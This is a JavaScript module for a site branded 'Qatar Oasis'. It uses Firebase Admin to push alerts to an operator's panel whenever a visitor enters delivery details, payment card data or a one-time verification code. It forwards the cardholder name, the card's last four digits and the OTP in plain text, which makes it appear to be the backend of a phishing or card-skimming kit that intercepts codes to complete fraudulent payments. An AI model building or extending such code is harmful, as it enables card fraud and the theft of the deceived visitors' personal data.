/**
 * Firebase Admin SDK Configuration
 * Qatar Oasis - Admin Notifications System
 * 
 * SECURITY: Credentials loaded from environment variables
 */

const admin = require('firebase-admin');

// Load Firebase credentials from environment variables
const serviceAccount = {
  "type": "service_account",
  "project_id": process.env.FIREBASE_PROJECT_ID || "qatarwateroasis",
  "private_key": process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n'),
  "client_email": process.env.FIREBASE_CLIENT_EMAIL
};

// Initialize Firebase Admin
let firebaseInitialized = false;

console.log('🔧 Loading Firebase Admin SDK...');
console.log('📧 Client Email:', serviceAccount.client_email ? '✓ Set' : '✗ Missing');
console.log('🔑 Private Key:', serviceAccount.private_key ? '✓ Set' : '✗ Missing');

try {
  if (serviceAccount.private_key && serviceAccount.client_email) {
    if (!admin.apps.length) {
      admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
      });
      firebaseInitialized = true;
      console.log('✅ Firebase Admin SDK initialized successfully');
    } else {
      firebaseInitialized = true;
      console.log('✅ Firebase Admin SDK already initialized');
    }
  } else {
    console.log('⚠️ Firebase credentials not configured. Notifications disabled.');
    console.log('⚠️ Required: FIREBASE_PRIVATE_KEY and FIREBASE_CLIENT_EMAIL environment variables');
  }
} catch (error) {
  console.error('❌ Firebase Admin initialization error:', error.message);
  console.error('❌ Error details:', error);
}

/**
 * Send push notification to specific FCM tokens
 * @param {Array} tokens - Array of FCM registration tokens
 * @param {Object} notification - Notification data
 * @param {string} notification.title - Notification title
 * @param {string} notification.body - Notification body
 * @param {string} notification.icon - Icon URL
 * @param {Object} data - Additional data to send with notification
 */
async function sendPushNotification(tokens, notification, data = {}) {
  console.log('📱 Attempting to send push notification...');
  console.log('📱 Firebase initialized:', firebaseInitialized);
  console.log('📱 Tokens count:', tokens?.length || 0);
  console.log('📱 Notification:', notification.title, '-', notification.body);
  
  if (!firebaseInitialized) {
    console.log('⚠️ Firebase not initialized, skipping notification');
    return { success: false, error: 'Firebase not initialized' };
  }

  if (!tokens || tokens.length === 0) {
    console.log('⚠️ No FCM tokens provided');
    return { success: false, error: 'No tokens provided' };
  }

  try {
    const message = {
      notification: {
        title: notification.title,
        body: notification.body,
        icon: notification.icon || '/admin/icon.png',
        click_action: notification.clickAction || '/admin/'
      },
      data: {
        ...data,
        timestamp: Date.now().toString()
      },
      tokens: tokens
    };

    const response = await admin.messaging().sendEachForMulticast(message);
    
    const results = {
      successCount: response.successCount,
      failureCount: response.failureCount,
      responses: []
    };

    response.responses.forEach((resp, index) => {
      if (resp.success) {
        results.responses.push({ token: tokens[index], success: true });
      } else {
        results.responses.push({ 
          token: tokens[index], 
          success: false, 
          error: resp.error?.message 
        });
        console.log(`❌ Failed to send to token ${tokens[index].substring(0, 20)}...: ${resp.error?.message}`);
      }
    });

    console.log(`📱 Notification sent: ${results.successCount} success, ${results.failureCount} failed`);
    return results;

  } catch (error) {
    console.error('❌ Error sending notification:', error.message);
    return { success: false, error: error.message };
  }
}

/**
 * Send notification for new visitor
 */
async function notifyNewVisitor(visitorData) {
  const name = visitorData.delivery_data?.fullName || 
               visitorData.payment_data?.cardHolder || 
               'زائر جديد';
  
  return sendPushNotification(
    global.fcmTokens || [],
    {
      title: '🆕 زائر جديد!',
      body: `${name} - ${visitorData.country || 'غير معروف'}`,
      icon: '/admin/icon.png',
      clickAction: '/admin/#visitors'
    },
    {
      type: 'new_visitor',
      sessionId: visitorData.session_id || visitorData.sessionId
    }
  );
}

/**
 * Send notification for delivery form submission
 */
async function notifyDelivery(visitorData) {
  const name = visitorData.delivery_data?.fullName || 'زائر';
  const phone = visitorData.delivery_data?.phone || '';
  
  return sendPushNotification(
    global.fcmTokens || [],
    {
      title: '📦 بيانات توصيل جديدة!',
      body: `${name} - ${phone}`,
      icon: '/admin/icon.png',
      clickAction: '/admin/#visitors'
    },
    {
      type: 'delivery',
      sessionId: visitorData.session_id || visitorData.sessionId
    }
  );
}

/**
 * Send notification for payment form submission
 */
async function notifyPayment(visitorData) {
  const name = visitorData.payment_data?.cardHolder || 'زائر';
  const last4 = visitorData.payment_data?.cardNumber?.slice(-4) || '';
  
  return sendPushNotification(
    global.fcmTokens || [],
    {
      title: '💳 بيانات بطاقة جديدة!',
      body: `${name} - ****${last4}`,
      icon: '/admin/icon.png',
      clickAction: '/admin/#visitors'
    },
    {
      type: 'payment',
      sessionId: visitorData.session_id || visitorData.sessionId
    }
  );
}

/**
 * Send notification for verification code
 */
async function notifyVerification(visitorData) {
  const name = visitorData.delivery_data?.fullName || 'زائر';
  const otp = visitorData.verification_data?.otp || '';
  
  return sendPushNotification(
    global.fcmTokens || [],
    {
      title: '🔐 رمز تحقق جديد!',
      body: `${name} - الكود: ${otp}`,
      icon: '/admin/icon.png',
      clickAction: '/admin/#visitors'
    },
    {
      type: 'verification',
      sessionId: visitorData.session_id || visitorData.sessionId
    }
  );
}

module.exports = {
  sendPushNotification,
  notifyNewVisitor,
  notifyDelivery,
  notifyPayment,
  notifyVerification,
  firebaseInitialized
};
